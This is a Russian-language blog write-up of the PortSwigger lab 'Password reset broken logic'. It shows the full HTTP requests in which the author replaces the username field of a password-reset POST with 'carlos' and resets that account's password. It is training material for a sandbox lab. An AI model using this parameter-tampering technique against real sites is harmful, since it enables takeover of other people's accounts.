---
title: "Password reset broken logic"
date: 2025-09-25
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-reset-broken-logic"
classes: wide
---

Для прохождения лабы нужно сбросить пароль пользователя `carlos`, а затем получить доступ к его аккаунту. Для входа даны креды `wiener`:`peter`.

```
https://0a650072031ae7f8806f8f2200d100d5.web-security-academy.net/
```

## Solution

На странице `/login` нашел кнопку сброса пароля. Попробую это сделать:

```http
POST /forgot-password HTTP/2
Host: 0a650072031ae7f8806f8f2200d100d5.web-security-academy.net
Cookie: session=2GGelaPHisz9MHHVU9MyRaBmLBF4xEf2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a650072031ae7f8806f8f2200d100d5.web-security-academy.net/forgot-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a650072031ae7f8806f8f2200d100d5.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener
```

На почту пришла следующая ссылка:

```
https://0a650072031ae7f8806f8f2200d100d5.web-security-academy.net/forgot-password?temp-forgot-password-token=g3y1mjmupkzdgq118lyvpojqrhl2btly
```

Попробую расшифровать токен:

```bash
echo 'g3y1mjmupkzdgq118lyvpojqrhl2btly' | base64 -d                                                                   
�|��9��L݂�u�\����vn�r%
```

`hashcat` тоже пожелал мне удачи) Значит пойду другим путем. Перейду по ссылке. Тут форма смены пароля:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_reset_broken_logic/1.png){: height="200" .align-center}

Сменю свой пароль:

```http
POST /forgot-password?temp-forgot-password-token=g3y1mjmupkzdgq118lyvpojqrhl2btly HTTP/2
Host: 0a650072031ae7f8806f8f2200d100d5.web-security-academy.net
Cookie: session=2GGelaPHisz9MHHVU9MyRaBmLBF4xEf2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a650072031ae7f8806f8f2200d100d5.web-security-academy.net/forgot-password?temp-forgot-password-token=g3y1mjmupkzdgq118lyvpojqrhl2btly
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: https://0a650072031ae7f8806f8f2200d100d5.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=g3y1mjmupkzdgq118lyvpojqrhl2btly&username=wiener&new-password-1=123&new-password-2=
```

В теле запроса передается переменная `username`. Хех... А что, если заменить ее на `carlos`? Получу новую ссылку и попробую это там:

```http
POST /forgot-password?temp-forgot-password-token=3eptbovnfg5htgqui5ztlxyxr79oy8di HTTP/2
Host: 0a650072031ae7f8806f8f2200d100d5.web-security-academy.net
Cookie: session=2GGelaPHisz9MHHVU9MyRaBmLBF4xEf2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a650072031ae7f8806f8f2200d100d5.web-security-academy.net/forgot-password?temp-forgot-password-token=g3y1mjmupkzdgq118lyvpojqrhl2btly
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: https://0a650072031ae7f8806f8f2200d100d5.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=3eptbovnfg5htgqui5ztlxyxr79oy8di&username=carlos&new-password-1=123&new-password-2=
```

Ответ:

```http
HTTP/2 302 Found
Location: /
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Попробую зайти в ЛК:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Password_reset_broken_logic/2.png){: height="200" .align-center}
